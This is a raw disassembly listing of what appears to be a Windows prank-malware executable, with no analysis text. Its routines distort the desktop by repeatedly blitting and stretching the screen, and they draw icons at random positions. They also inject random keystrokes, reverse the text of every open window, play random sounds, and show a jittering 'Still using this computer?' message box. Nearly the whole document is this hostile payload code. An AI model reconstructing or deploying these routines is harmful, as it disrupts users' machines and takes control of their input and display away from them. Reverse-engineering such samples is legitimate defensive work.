.text:004015A2 Rect            = tagRECT ptr -10h
.text:004015A2
.text:004015A2                 push    ebp
.text:004015A3                 mov     ebp, esp
.text:004015A5                 sub     esp, 10h
.text:004015A8                 push    esi
.text:004015A9                 push    edi
.text:004015AA                 call    ds:GetDesktopWindow ; USER32
.text:004015B0                 mov     edi, eax
.text:004015B2                 push    edi             ; hWnd
.text:004015B3                 call    ds:GetWindowDC  ; USER32
.text:004015B9                 mov     esi, eax
.text:004015BB                 lea     eax, [ebp+Rect]
.text:004015BE                 push    eax             ; lpRect
.text:004015BF                 push    edi             ; hWnd
.text:004015C0                 call    ds:GetWindowRect ; USER32
.text:004015C6                 mov     eax, [ebp+Rect.bottom]
.text:004015C9                 xor     ecx, ecx
.text:004015CB                 sub     eax, [ebp+Rect.top]
.text:004015CE                 push    330008h         ; rop
.text:004015D3                 push    ecx             ; y1
.text:004015D4                 push    ecx             ; x1
.text:004015D5                 push    esi             ; hdcSrc
.text:004015D6                 push    eax             ; cy
.text:004015D7                 mov     eax, [ebp+Rect.right]
.text:004015DA                 sub     eax, [ebp+Rect.left]
.text:004015DD                 push    eax             ; cx
.text:004015DE                 push    ecx             ; y
.text:004015DF                 push    ecx             ; x
.text:004015E0                 push    esi             ; hdc
.text:004015E1                 call    ds:BitBlt       ; GDI32
.text:004015E7                 push    esi             ; hDC
.text:004015E8                 push    edi             ; hWnd
.text:004015E9                 call    ds:ReleaseDC    ; USER32
.text:004015EF                 push    64h ; 'd'
.text:004015F1                 pop     eax
.text:004015F2                 pop     edi
.text:004015F3                 pop     esi
.text:004015F4                 mov     esp, ebp
.text:004015F6                 pop     ebp
.text:004015F7                 retn
.text:004015F7 sub_4015A2      endp
.text:004015F7
.text:004015F8
.text:004015F8 ; =============== S U B R O U T I N E =======================================
.text:004015F8
.text:004015F8 ; Attributes: bp-based frame
.text:004015F8
.text:004015F8 ; int __cdecl sub_4015F8(int)
.text:004015F8 sub_4015F8      proc near               ; DATA XREF: .rdata:00403380↓o
.text:004015F8
.text:004015F8 var_4           = dword ptr -4
.text:004015F8 arg_0           = dword ptr  8
.text:004015F8
.text:004015F8                 push    ebp
.text:004015F9                 mov     ebp, esp
.text:004015FB                 push    ecx
.text:004015FC                 push    ecx
.text:004015FD                 xor     eax, eax
.text:004015FF                 push    eax             ; lpThreadId
.text:00401600                 push    eax             ; dwCreationFlags
.text:00401601                 push    eax             ; lpParameter
.text:00401602                 push    offset sub_401978 ; lpStartAddress
.text:00401607                 push    1000h           ; dwStackSize
.text:0040160C                 push    eax             ; lpThreadAttributes
.text:0040160D                 call    ds:CreateThread ; KERNEL32
.text:00401613                 call    sub_401A37
.text:00401618                 push    1Eh
.text:0040161A                 cdq
.text:0040161B                 pop     ecx
.text:0040161C                 idiv    ecx
.text:0040161E                 mov     [ebp+var_4], edx
.text:00401621                 fild    [ebp+var_4]
.text:00401624                 fstp    qword ptr [ebp-8]
.text:00401627                 fld     qword ptr [ebp-8]
.text:0040162A                 fild    [ebp+arg_0]
.text:0040162D                 fstp    qword ptr [ebp-8]
.text:00401630                 fld     qword ptr [ebp-8]
.text:00401633                 fmul    ds:dbl_4033F8
.text:00401639                 fadd    ds:dbl_403400
.text:0040163F                 fdivr   ds:dbl_403458
.text:00401645                 fadd    ds:dbl_403430
.text:0040164B                 faddp   st(1), st
.text:0040164D                 call    sub_401AE6
.text:00401652                 mov     esp, ebp
.text:00401654                 pop     ebp
.text:00401655                 retn
.text:00401655 sub_4015F8      endp
.text:00401655
.text:00401656
.text:00401656 ; =============== S U B R O U T I N E =======================================
.text:00401656
.text:00401656
.text:00401656 ; int sub_401656()
.text:00401656 sub_401656      proc near               ; DATA XREF: .rdata:00403390↓o
.text:00401656                 push    0               ; lParam
.text:00401658                 push    offset EnumFunc ; lpEnumFunc
.text:0040165D                 call    ds:EnumWindows  ; USER32
.text:00401663                 push    32h ; '2'
.text:00401665                 pop     eax
.text:00401666                 retn
.text:00401666 sub_401656      endp
.text:00401666
.text:00401667
.text:00401667 ; =============== S U B R O U T I N E =======================================
.text:00401667
.text:00401667
.text:00401667 ; int __thiscall sub_401667(void *this)
.text:00401667 sub_401667      proc near               ; DATA XREF: .rdata:00403370↓o
.text:00401667                 push    1               ; fdwSound
.text:00401669                 push    0               ; hmod
.text:0040166B                 call    sub_401A37
.text:00401670                 xor     edx, edx
.text:00401672                 div     ds:dword_4021F0
.text:00401678                 push    pszSound[edx*4] ; pszSound
.text:0040167F                 call    ds:PlaySoundA   ; WINMM
.text:00401685                 call    sub_401A37
.text:0040168A                 push    14h
.text:0040168C                 cdq
.text:0040168D                 pop     ecx
.text:0040168E                 idiv    ecx
.text:00401690                 lea     eax, [ecx+edx]
.text:00401693                 retn
.text:00401693 sub_401667      endp
.text:00401693
.text:00401694
.text:00401694 ; =============== S U B R O U T I N E =======================================
.text:00401694
.text:00401694 ; Attributes: bp-based frame
.text:00401694
.text:00401694 ; int __cdecl sub_401694(int)
.text:00401694 sub_401694      proc near               ; DATA XREF: .rdata:004033A0↓o
.text:00401694
.text:00401694 Rect            = tagRECT ptr -24h
.text:00401694 hWnd            = dword ptr -10h
.text:00401694 x               = dword ptr -0Ch
.text:00401694 y               = dword ptr -8
.text:00401694 hdc             = dword ptr -4
.text:00401694 arg_0           = dword ptr  8
.text:00401694
.text:00401694                 push    ebp
.text:00401695                 mov     ebp, esp
.text:00401697                 sub     esp, 24h
.text:0040169A                 push    ebx
.text:0040169B                 push    esi
.text:0040169C                 push    edi
.text:0040169D                 call    ds:GetDesktopWindow ; USER32
.text:004016A3                 mov     ebx, eax
.text:004016A5                 push    ebx             ; hWnd
.text:004016A6                 mov     [ebp+hWnd], ebx
.text:004016A9                 call    ds:GetWindowDC  ; USER32
.text:004016AF                 mov     [ebp+hdc], eax
.text:004016B2                 lea     eax, [ebp+Rect]
.text:004016B5                 push    eax             ; lpRect
.text:004016B6                 push    ebx             ; hWnd
.text:004016B7                 call    ds:GetWindowRect ; USER32
.text:004016BD                 call    sub_401A37
.text:004016C2                 mov     ecx, [ebp+Rect.right]
.text:004016C5                 add     ecx, 0FFFFFF9Ch
.text:004016C8                 cdq
.text:004016C9                 idiv    ecx
.text:004016CB                 mov     [ebp+x], edx
.text:004016CE                 call    sub_401A37
.text:004016D3                 mov     ecx, [ebp+Rect.bottom]
.text:004016D6                 add     ecx, 0FFFFFF9Ch
.text:004016D9                 cdq
.text:004016DA                 idiv    ecx
.text:004016DC                 mov     [ebp+y], edx
.text:004016DF                 call    sub_401A37
.text:004016E4                 mov     ecx, [ebp+Rect.right]
.text:004016E7                 add     ecx, 0FFFFFF9Ch
.text:004016EA                 cdq
.text:004016EB                 idiv    ecx
.text:004016ED                 mov     ebx, edx
.text:004016EF                 call    sub_401A37
.text:004016F4                 mov     ecx, [ebp+Rect.bottom]
.text:004016F7                 add     ecx, 0FFFFFF9Ch
.text:004016FA                 cdq
.text:004016FB                 idiv    ecx
.text:004016FD                 mov     edi, edx
.text:004016FF                 call    sub_401A37
.text:00401704                 cdq
.text:00401705                 mov     ecx, 258h
.text:0040170A                 idiv    ecx
.text:0040170C                 mov     esi, edx
.text:0040170E                 call    sub_401A37
.text:00401713                 cdq
.text:00401714                 mov     ecx, 258h
.text:00401719                 idiv    ecx
.text:0040171B                 push    0CC0020h        ; rop
.text:00401720                 push    edi             ; y1
.text:00401721                 push    ebx             ; x1
.text:00401722                 mov     ebx, [ebp+hdc]
.text:00401725                 push    ebx             ; hdcSrc
.text:00401726                 push    edx             ; cy
.text:00401727                 push    esi             ; cx
.text:00401728                 push    [ebp+y]         ; y
.text:0040172B                 push    [ebp+x]         ; x
.text:0040172E                 push    ebx             ; hdc
.text:0040172F                 call    ds:BitBlt       ; GDI32
.text:00401735                 push    ebx             ; hDC
.text:00401736                 push    [ebp+hWnd]      ; hWnd
.text:00401739                 call    ds:ReleaseDC    ; USER32
.text:0040173F                 fild    [ebp+arg_0]
.text:00401742                 fstp    qword ptr [ebp-14h]
.text:00401745                 fld     qword ptr [ebp-14h]
.text:00401748                 fdiv    ds:dbl_403418
.text:0040174E                 fadd    ds:dbl_403400
.text:00401754                 fdivr   ds:dbl_403440
.text:0040175A                 fadd    ds:dbl_403408
.text:00401760                 call    sub_401AE6
.text:00401765                 pop     edi
.text:00401766                 pop     esi
.text:00401767                 pop     ebx
.text:00401768                 mov     esp, ebp
.text:0040176A                 pop     ebp
.text:0040176B                 retn
.text:0040176B sub_401694      endp
.text:0040176B
.text:0040176C
.text:0040176C ; =============== S U B R O U T I N E =======================================
.text:0040176C
.text:0040176C ; Attributes: bp-based frame
.text:0040176C
.text:0040176C ; int __thiscall sub_40176C(void *this)
.text:0040176C sub_40176C      proc near               ; DATA XREF: .rdata:00403368↓o
.text:0040176C
.text:0040176C pInputs         = tagINPUT ptr -1Ch
.text:0040176C
.text:0040176C                 push    ebp
.text:0040176D                 mov     ebp, esp
.text:0040176F                 sub     esp, 1Ch
.text:00401772                 mov     [ebp+pInputs.type], 1
.text:00401779                 call    sub_401A37
.text:0040177E                 push    2Ah ; '*'
.text:00401780                 pop     ecx
.text:00401781                 cdq
.text:00401782                 idiv    ecx
.text:00401784                 push    1Ch             ; cbSize
.text:00401786                 lea     eax, [ebp+pInputs]
.text:00401789                 add     edx, 30h ; '0'
.text:0040178C                 push    eax             ; pInputs
.text:0040178D                 push    1               ; cInputs
.text:0040178F                 mov     word ptr [ebp+pInputs.4], dx
.text:00401793                 call    ds:SendInput    ; USER32
.text:00401799                 call    sub_401A37
.text:0040179E                 cdq
.text:0040179F                 mov     ecx, 190h
.text:004017A4                 idiv    ecx
.text:004017A6                 lea     eax, [edx+12Ch]
.text:004017AC                 mov     esp, ebp
.text:004017AE                 pop     ebp
.text:004017AF                 retn
.text:004017AF sub_40176C      endp
.text:004017AF
.text:004017B0
.text:004017B0 ; =============== S U B R O U T I N E =======================================
.text:004017B0
.text:004017B0 ; Attributes: bp-based frame
.text:004017B0
.text:004017B0 ; int __cdecl sub_4017B0(int)
.text:004017B0 sub_4017B0      proc near               ; DATA XREF: .rdata:00403398↓o
.text:004017B0
.text:004017B0 Rect            = tagRECT ptr -18h
.text:004017B0 var_8           = qword ptr -8
.text:004017B0 arg_0           = dword ptr  8
.text:004017B0
.text:004017B0                 push    ebp
.text:004017B1                 mov     ebp, esp
.text:004017B3                 sub     esp, 18h
.text:004017B6                 push    esi
.text:004017B7                 push    edi
.text:004017B8                 call    ds:GetDesktopWindow ; USER32
.text:004017BE                 mov     edi, eax
.text:004017C0                 push    edi             ; hWnd
.text:004017C1                 call    ds:GetWindowDC  ; USER32
.text:004017C7                 mov     esi, eax
.text:004017C9                 lea     eax, [ebp+Rect]
.text:004017CC                 push    eax             ; lpRect
.text:004017CD                 push    edi             ; hWnd
.text:004017CE                 call    ds:GetWindowRect ; USER32
.text:004017D4                 mov     eax, [ebp+Rect.bottom]
.text:004017D7                 mov     ecx, [ebp+Rect.right]
.text:004017DA                 push    0CC0020h        ; rop
.text:004017DF                 push    eax             ; hSrc
.text:004017E0                 push    ecx             ; wSrc
.text:004017E1                 push    0               ; ySrc
.text:004017E3                 push    0               ; xSrc
.text:004017E5                 push    esi             ; hdcSrc
.text:004017E6                 add     eax, 0FFFFFF9Ch
.text:004017E9                 push    eax             ; hDest
.text:004017EA                 lea     eax, [ecx-64h]
.text:004017ED                 push    eax             ; wDest
.text:004017EE                 push    32h ; '2'       ; yDest
.text:004017F0                 push    32h ; '2'       ; xDest
.text:004017F2                 push    esi             ; hdcDest
.text:004017F3                 call    ds:StretchBlt   ; GDI32
.text:004017F9                 push    esi             ; hDC
.text:004017FA                 push    edi             ; hWnd
.text:004017FB                 call    ds:ReleaseDC    ; USER32
.text:00401801                 fild    [ebp+arg_0]
.text:00401804                 fstp    [ebp+var_8]
.text:00401807                 fld     [ebp+var_8]
.text:0040180A                 fdiv    ds:dbl_403418
.text:00401810                 fadd    ds:dbl_403400
.text:00401816                 fdivr   ds:dbl_403440
.text:0040181C                 fadd    ds:dbl_403410
.text:00401822                 call    sub_401AE6
.text:00401827                 pop     edi
.text:00401828                 pop     esi
.text:00401829                 mov     esp, ebp
.text:0040182B                 pop     ebp
.text:0040182C                 retn
.text:0040182C sub_4017B0      endp
.text:0040182C
.text:0040182D
.text:0040182D ; =============== S U B R O U T I N E =======================================
.text:0040182D
.text:0040182D ; Attributes: bp-based frame
.text:0040182D
.text:0040182D ; int __cdecl sub_40182D(int)
.text:0040182D sub_40182D      proc near               ; DATA XREF: .rdata:00403388↓o
.text:0040182D
.text:0040182D var_14          = qword ptr -14h
.text:0040182D Point           = tagPOINT ptr -0Ch
.text:0040182D hWnd            = dword ptr -4
.text:0040182D arg_0           = dword ptr  8
.text:0040182D
.text:0040182D                 push    ebp
.text:0040182E                 mov     ebp, esp
.text:00401830                 sub     esp, 14h
.text:00401833                 push    ebx
.text:00401834                 push    esi
.text:00401835                 mov     esi, ds:GetSystemMetrics ; USER32
.text:0040183B                 push    edi
.text:0040183C                 push    0Bh             ; nIndex
.text:0040183E                 call    esi ; GetSystemMetrics ; USER32
.text:00401840                 cdq
.text:00401841                 sub     eax, edx
.text:00401843                 mov     edi, eax
.text:00401845                 push    0Ch             ; nIndex
.text:00401847                 sar     edi, 1
.text:00401849                 call    esi ; GetSystemMetrics ; USER32
.text:0040184B                 cdq
.text:0040184C                 sub     eax, edx
.text:0040184E                 mov     esi, eax
.text:00401850                 sar     esi, 1
.text:00401852                 call    ds:GetDesktopWindow ; USER32
.text:00401858                 push    eax             ; hWnd
.text:00401859                 mov     [ebp+hWnd], eax
.text:0040185C                 call    ds:GetWindowDC  ; USER32
.text:00401862                 mov     ebx, eax
.text:00401864                 lea     eax, [ebp+Point]
.text:00401867                 push    eax             ; lpPoint
.text:00401868                 call    ds:GetCursorPos ; USER32
.text:0040186E                 push    7F01h           ; lpIconName
.text:00401873                 push    0               ; hInstance
.text:00401875                 call    ds:LoadIconA    ; USER32
.text:0040187B                 push    eax             ; hIcon
.text:0040187C                 mov     eax, [ebp+Point.y]
.text:0040187F                 sub     eax, esi
.text:00401881                 push    eax             ; Y
.text:00401882                 mov     eax, [ebp+Point.x]
.text:00401885                 sub     eax, edi
.text:00401887                 mov     edi, ds:DrawIcon ; USER32
.text:0040188D                 push    eax             ; X
.text:0040188E                 push    ebx             ; hDC
.text:0040188F                 call    edi ; DrawIcon  ; USER32
.text:00401891                 call    sub_401A37
.text:00401896                 fild    [ebp+arg_0]
.text:00401899                 mov     esi, eax
.text:0040189B                 fstp    [ebp+var_14]
.text:0040189E                 fld     [ebp+var_14]
.text:004018A1                 fdiv    ds:dbl_403448
.text:004018A7                 fld1
.text:004018A9                 fadd    st(1), st
.text:004018AB                 fld     ds:dbl_403420
.text:004018B1                 fdivrp  st(2), st
.text:004018B3                 faddp   st(1), st
.text:004018B5                 call    sub_401AE6
.text:004018BA                 mov     ecx, eax
.text:004018BC                 mov     eax, esi
.text:004018BE                 cdq
.text:004018BF                 idiv    ecx
.text:004018C1                 test    edx, edx
.text:004018C3                 jnz     short loc_4018EF
.text:004018C5                 push    7F03h           ; lpIconName
.text:004018CA                 push    edx             ; hInstance
.text:004018CB                 call    ds:LoadIconA    ; USER32
.text:004018D1                 push    eax             ; hIcon
.text:004018D2                 call    sub_401A37
.text:004018D7                 cdq
.text:004018D8                 idiv    dword_4040E8
.text:004018DE                 push    edx             ; Y
.text:004018DF                 call    sub_401A37
.text:004018E4                 cdq
.text:004018E5                 idiv    dword_4040E4
.text:004018EB                 push    edx             ; X
.text:004018EC                 push    ebx             ; hDC
.text:004018ED                 call    edi ; DrawIcon  ; USER32
.text:004018EF
.text:004018EF loc_4018EF:                             ; CODE XREF: sub_40182D+96↑j
.text:004018EF                 push    ebx             ; hDC
.text:004018F0                 push    [ebp+hWnd]      ; hWnd
.text:004018F3                 call    ds:ReleaseDC    ; USER32
.text:004018F9                 push    2
.text:004018FB                 pop     eax
.text:004018FC                 pop     edi
.text:004018FD                 pop     esi
.text:004018FE                 pop     ebx
.text:004018FF                 mov     esp, ebp
.text:00401901                 pop     ebp
.text:00401902                 retn
.text:00401902 sub_40182D      endp
.text:00401902
.text:00401903
.text:00401903 ; =============== S U B R O U T I N E =======================================
.text:00401903
.text:00401903 ; Attributes: bp-based frame
.text:00401903
.text:00401903 ; BOOL __stdcall EnumFunc(HWND, LPARAM)
.text:00401903 EnumFunc        proc near               ; DATA XREF: sub_401656+2↑o
.text:00401903
.text:00401903 hWnd            = dword ptr  8
.text:00401903
.text:00401903                 push    ebp
.text:00401904                 mov     ebp, esp
.text:00401906                 push    [ebp+hWnd]      ; hWnd
.text:00401909                 call    sub_401916
.text:0040190E                 xor     eax, eax
.text:00401910                 pop     ecx
.text:00401911                 inc     eax
.text:00401912                 pop     ebp
.text:00401913                 retn    8
.text:00401913 EnumFunc        endp
.text:00401913
.text:00401916
.text:00401916 ; =============== S U B R O U T I N E =======================================
.text:00401916
.text:00401916 ; Attributes: bp-based frame
.text:00401916
.text:00401916 ; HWND __cdecl sub_401916(HWND hWnd)
.text:00401916 sub_401916      proc near               ; CODE XREF: EnumFunc+6↑p
.text:00401916                                         ; sub_401916+4D↓p
.text:00401916
.text:00401916 hWnd            = dword ptr  8
.text:00401916
.text:00401916                 push    ebp
.text:00401917                 mov     ebp, esp
.text:00401919                 push    esi
.text:0040191A                 push    edi
.text:0040191B                 push    4000h           ; dwBytes
.text:00401920                 push    40h ; '@'       ; uFlags
.text:00401922                 call    ds:GlobalAlloc  ; KERNEL32
.text:00401928                 mov     esi, ds:SendMessageW ; USER32
.text:0040192E                 mov     edi, eax
.text:00401930                 push    edi             ; lParam
.text:00401931                 push    2000h           ; wParam
.text:00401936                 push    0Dh             ; Msg
.text:00401938                 push    [ebp+hWnd]      ; hWnd
.text:0040193B                 call    esi ; SendMessageW ; USER32
.text:0040193D                 push    edi             ; lpString
.text:0040193E                 call    sub_401A82
.text:00401943                 pop     ecx
.text:00401944                 push    edi             ; lParam
.text:00401945                 push    0               ; wParam
.text:00401947                 push    0Ch             ; Msg
.text:00401949                 push    [ebp+hWnd]      ; hWnd
.text:0040194C                 call    esi ; SendMessageW ; USER32
.text:0040194E                 push    edi             ; hMem
.text:0040194F                 call    ds:GlobalFree   ; KERNEL32
.text:00401955                 mov     edi, ds:GetWindow ; USER32
.text:0040195B                 push    5
.text:0040195D                 push    [ebp+hWnd]
.text:00401960                 jmp     short loc_40196C
.text:00401962 ; ---------------------------------------------------------------------------
.text:00401962
.text:00401962 loc_401962:                             ; CODE XREF: sub_401916+5C↓j
.text:00401962                 push    esi             ; hWnd
.text:00401963                 call    sub_401916
.text:00401968                 pop     ecx
.text:00401969                 push    2               ; uCmd
.text:0040196B                 push    esi             ; hWnd
.text:0040196C
.text:0040196C loc_40196C:                             ; CODE XREF: sub_401916+4A↑j
.text:0040196C                 call    edi ; GetWindow ; USER32
.text:0040196E                 mov     esi, eax
.text:00401970                 test    esi, esi
.text:00401972                 jnz     short loc_401962
.text:00401974                 pop     edi
.text:00401975                 pop     esi
.text:00401976                 pop     ebp
.text:00401977                 retn
.text:00401977 sub_401916      endp
.text:00401977
.text:00401978
.text:00401978 ; =============== S U B R O U T I N E =======================================
.text:00401978
.text:00401978
.text:00401978 ; DWORD __stdcall sub_401978(LPVOID lpThreadParameter)
.text:00401978 sub_401978      proc near               ; DATA XREF: sub_4015F8+A↑o
.text:00401978
.text:00401978 lpThreadParameter= dword ptr  4
.text:00401978
.text:00401978                 push    esi
.text:00401979                 call    ds:GetCurrentThreadId ; KERNEL32
.text:0040197F                 push    eax             ; dwThreadId
.text:00401980                 push    0               ; hmod
.text:00401982                 push    offset fn       ; lpfn
.text:00401987                 push    5               ; idHook
.text:00401989                 call    ds:SetWindowsHookExA ; USER32
.text:0040198F                 push    1030h           ; uType
.text:00401994                 push    offset aLol     ; "lol"
.text:00401999                 push    offset Text     ; "Still using this computer?"
.text:0040199E                 push    0               ; hWnd
.text:004019A0                 mov     esi, eax
.text:004019A2                 call    ds:MessageBoxW  ; USER32
.text:004019A8                 push    esi             ; hhk
.text:004019A9                 call    ds:UnhookWindowsHookEx ; USER32
.text:004019AF                 xor     eax, eax
.text:004019B1                 pop     esi
.text:004019B2                 retn    4
.text:004019B2 sub_401978      endp
.text:004019B2
.text:004019B5
.text:004019B5 ; =============== S U B R O U T I N E =======================================
.text:004019B5
.text:004019B5 ; Attributes: bp-based frame
.text:004019B5
.text:004019B5 ; LRESULT __thiscall fn(void *this, int code, WPARAM wParam, LPARAM lParam)
.text:004019B5 fn              proc near               ; DATA XREF: sub_401021+E7↑o
.text:004019B5                                         ; sub_401978+A↑o
.text:004019B5
.text:004019B5 code            = dword ptr  8
.text:004019B5 wParam          = dword ptr  0Ch
.text:004019B5 lParam          = dword ptr  10h
.text:004019B5
.text:004019B5                 push    ebp
.text:004019B6                 mov     ebp, esp
.text:004019B8                 cmp     [ebp+code], 3
.text:004019BC                 push    edi
.text:004019BD                 mov     edi, [ebp+lParam]
.text:004019C0                 jnz     short loc_4019FB
.text:004019C2                 push    ebx
.text:004019C3                 mov     ebx, [edi]
.text:004019C5                 test    dword ptr [ebx+20h], 80400000h
.text:004019CC                 jz      short loc_4019FA
.text:004019CE                 push    esi
.text:004019CF                 call    sub_401A37
.text:004019D4                 mov     ecx, dword_4040E4
.text:004019DA                 sub     ecx, [ebx+14h]
.text:004019DD                 cdq
.text:004019DE                 idiv    ecx
.text:004019E0                 mov     esi, edx
.text:004019E2                 call    sub_401A37
.text:004019E7                 mov     ecx, dword_4040E8
.text:004019ED                 sub     ecx, [ebx+10h]
.text:004019F0                 cdq
.text:004019F1                 idiv    ecx
.text:004019F3                 mov     [ebx+1Ch], esi
.text:004019F6                 mov     [ebx+18h], edx
.text:004019F9                 pop     esi
.text:004019FA
.text:004019FA loc_4019FA:                             ; CODE XREF: fn+17↑j
.text:004019FA                 pop     ebx
.text:004019FB
.text:004019FB loc_4019FB:                             ; CODE XREF: fn+B↑j
.text:004019FB                 push    edi             ; lParam
.text:004019FC                 push    [ebp+wParam]    ; wParam
.text:004019FF                 push    [ebp+code]      ; nCode
.text:00401A02                 push    0               ; hhk
.text:00401A04                 call    ds:CallNextHookEx ; USER32
.text:00401A0A                 pop     edi
.text:00401A0B                 pop     ebp
.text:00401A0C                 retn    0Ch
.text:00401A0C fn              endp
.text:00401A0C
.text:00401A0F
.text:00401A0F ; =============== S U B R O U T I N E =======================================
.text:00401A0F
.text:00401A0F ; Attributes: noreturn bp-based frame
.text:00401A0F
.text:00401A0F ; void __stdcall __noreturn sub_401A0F(int (__cdecl *lpThreadParameter)(int, int))
.text:00401A0F sub_401A0F      proc near               ; DATA XREF: start+203↑o
.text:00401A0F
.text:00401A0F lpThreadParameter= dword ptr  8
.text:00401A0F
.text:00401A0F                 push    ebp
.text:00401A10                 mov     ebp, esp
.text:00401A12                 push    ebx
.text:00401A13                 push    esi
.text:00401A14                 xor     esi, esi
.text:00401A16                 push    edi
.text:00401A17                 mov     ebx, esi
.text:00401A19                 mov     edi, esi
.text:00401A1B
.text:00401A1B loc_401A1B:                             ; CODE XREF: sub_401A0F+26↓j
.text:00401A1B                 mov     eax, esi
.text:00401A1D                 dec     esi
.text:00401A1E                 test    eax, eax
.text:00401A20                 jnz     short loc_401A2C
.text:00401A22                 push    edi
.text:00401A23                 push    ebx
.text:00401A24                 call    [ebp+lpThreadParameter]
.text:00401A27                 pop     ecx
.text:00401A28                 pop     ecx
.text:00401A29                 mov     esi, eax
.text:00401A2B                 inc     ebx
.text:00401A2C
.text:00401A2C loc_401A2C:                             ; CODE XREF: sub_401A0F+11↑j
.text:00401A2C                 push    0Ah             ; dwMilliseconds
.text:00401A2E                 inc     edi
.text:00401A2F                 call    ds:Sleep        ; KERNEL32
.text:00401A35                 jmp     short loc_401A1B
.text:00401A35 sub_401A0F      endp
.text:00401A35
.text:00401A37
.text:00401A37 ; =============== S U B R O U T I N E =======================================
.text:00401A37
.text:00401A37 ; Attributes: bp-based frame
.text:00401A37
.text:00401A37 ; int __fastcall sub_401A37(int)
.text:00401A37 sub_401A37      proc near               ; CODE XREF: sub_401021+100↑p
.text:00401A37                                         ; sub_4014CA+B↑p ...
.text:00401A37
.text:00401A37 pbBuffer        = byte ptr -4
.text:00401A37
.text:00401A37                 push    ebp
.text:00401A38                 mov     ebp, esp
.text:00401A3A                 push    ecx
.text:00401A3B                 mov     eax, hProv
.text:00401A40                 test    eax, eax
.text:00401A42                 jnz     short loc_401A69
.text:00401A44                 push    0F0000040h      ; dwFlags
.text:00401A49                 push    1               ; dwProvType
.text:00401A4B                 push    eax             ; szProvider
.text:00401A4C                 push    eax             ; szContainer
.text:00401A4D                 push    offset hProv    ; phProv
.text:00401A52                 call    ds:CryptAcquireContextA ; ADVAPI32
.text:00401A58                 test    eax, eax
.text:00401A5A                 jnz     short loc_401A64
.text:00401A5C                 push    1               ; uExitCode
.text:00401A5E                 call    ds:ExitProcess  ; KERNEL32
.text:00401A64 ; ---------------------------------------------------------------------------
.text:00401A64
.text:00401A64 loc_401A64:                             ; CODE XREF: sub_401A37+23↑j
.text:00401A64                 mov     eax, hProv
.text:00401A69
.text:00401A69 loc_401A69:                             ; CODE XREF: sub_401A37+B↑j
.text:00401A69                 lea     ecx, [ebp+pbBuffer]
.text:00401A6C                 push    ecx             ; pbBuffer
.text:00401A6D                 push    4               ; dwLen
.text:00401A6F                 push    eax             ; hProv
.text:00401A70                 call    ds:CryptGenRandom ; ADVAPI32
.text:00401A76                 mov     eax, dword ptr [ebp+pbBuffer]
.text:00401A79                 and     eax, 7FFFFFFFh
.text:00401A7E                 mov     esp, ebp
.text:00401A80                 pop     ebp
.text:00401A81                 retn
.text:00401A81 sub_401A37      endp
.text:00401A81
.text:00401A82
.text:00401A82 ; =============== S U B R O U T I N E =======================================
.text:00401A82
.text:00401A82 ; Attributes: bp-based frame
.text:00401A82
.text:00401A82 ; int __cdecl sub_401A82(LPCWSTR lpString)
.text:00401A82 sub_401A82      proc near               ; CODE XREF: sub_401916+28↑p
.text:00401A82
.text:00401A82 var_4           = dword ptr -4
.text:00401A82 lpString        = dword ptr  8
.text:00401A82
.text:00401A82                 push    ebp
.text:00401A83                 mov     ebp, esp
.text:00401A85                 push    ecx
.text:00401A86                 push    ebx
.text:00401A87                 push    esi
.text:00401A88                 push    edi
.text:00401A89                 mov     edi, [ebp+lpString]
.text:00401A8C                 xor     esi, esi
.text:00401A8E                 push    edi             ; lpString
.text:00401A8F                 mov     ebx, esi
.text:00401A91                 call    ds:lstrlenW     ; KERNEL32
.text:00401A97                 dec     eax
.text:00401A98                 mov     edx, eax
.text:00401A9A                 mov     [ebp+var_4], eax
.text:00401A9D                 test    edx, edx
.text:00401A9F                 jle     short loc_401ABA
.text:00401AA1
.text:00401AA1 loc_401AA1:                             ; CODE XREF: sub_401A82+33↓j
.text:00401AA1                 mov     ax, [edi+edx*2]
.text:00401AA5                 movzx   ecx, word ptr [edi+ebx*2]
.text:00401AA9                 mov     [edi+ebx*2], ax
.text:00401AAD                 inc     ebx
.text:00401AAE                 mov     [edi+edx*2], cx
.text:00401AB2                 dec     edx
.text:00401AB3                 cmp     ebx, edx
.text:00401AB5                 jl      short loc_401AA1
.text:00401AB7                 mov     eax, [ebp+var_4]
.text:00401ABA
.text:00401ABA loc_401ABA:                             ; CODE XREF: sub_401A82+1D↑j
.text:00401ABA                 test    eax, eax
.text:00401ABC                 jle     short loc_401ADF
.text:00401ABE                 push    0Ah
.text:00401AC0                 pop     edx
.text:00401AC1                 push    0Dh
.text:00401AC3                 pop     ecx
.text:00401AC4
.text:00401AC4 loc_401AC4:                             ; CODE XREF: sub_401A82+5B↓j
.text:00401AC4                 cmp     [edi+esi*2], dx
.text:00401AC8                 jnz     short loc_401ADA
.text:00401ACA                 cmp     [edi+esi*2+2], cx
.text:00401ACF                 jnz     short loc_401ADA
.text:00401AD1                 mov     [edi+esi*2], cx
.text:00401AD5                 mov     [edi+esi*2+2], dx
.text:00401ADA
.text:00401ADA loc_401ADA:                             ; CODE XREF: sub_401A82+46↑j
.text:00401ADA                                         ; sub_401A82+4D↑j
.text:00401ADA                 inc     esi
.text:00401ADB                 cmp     esi, eax
.text:00401ADD                 jl      short loc_401AC4
.text:00401ADF
.text:00401ADF loc_401ADF:                             ; CODE XREF: sub_401A82+3A↑j
.text:00401ADF                 pop     edi
.text:00401AE0                 pop     esi
.text:00401AE1                 pop     ebx
.text:00401AE2                 mov     esp, ebp
.text:00401AE4                 pop     ebp
.text:00401AE5                 retn
.text:00401AE5 sub_401A82      endp
.text:00401AE5
.text:00401AE6
.text:00401AE6 ; =============== S U B R O U T I N E =======================================
.text:00401AE6
.text:00401AE6
.text:00401AE6 ; int __usercall sub_401AE6@<eax>(double@<st0>)
.text:00401AE6 sub_401AE6      proc near               ; CODE XREF: sub_4014CA+68↑p
.text:00401AE6                                         ; sub_4015F8+55↑p ...
.text:00401AE6
.text:00401AE6 var_4           = dword ptr -4
.text:00401AE6
.text:00401AE6                 fistp   [esp+var_4]
.text:00401AEA                 mov     eax, [esp+var_4]
.text:00401AEE                 retn
.text:00401AEE sub_401AE6      endp
.text:00401AEE
.text:00401AEE ; ---------------------------------------------------------------------------
.text:00401AEF                 align 10h
.text:00401AF0 ; [00000006 BYTES: COLLAPSED FUNCTION CreateToolhelp32Snapshot]
.text:00401AF6 ; [00000006 BYTES: COLLAPSED FUNCTION Process32First]
.text:00401AFC ; [00000006 BYTES: COLLAPSED FUNCTION Process32Next]
.text:00401B02 ; [00000006 BYTES: COLLAPSED FUNCTION GetProcessImageFileNameA]
.text:00401B08                 align 100h
.text:00401C00                 dd 100h dup(?)
.text:00401C00 _text           ends
